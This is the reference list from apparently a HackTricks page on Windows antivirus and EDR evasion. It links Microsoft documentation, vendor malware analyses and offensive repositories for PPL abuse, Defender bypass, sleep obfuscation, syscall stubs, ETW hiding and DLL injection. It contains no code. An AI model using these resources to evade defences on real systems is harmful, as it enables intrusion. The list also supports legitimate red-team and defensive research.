- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
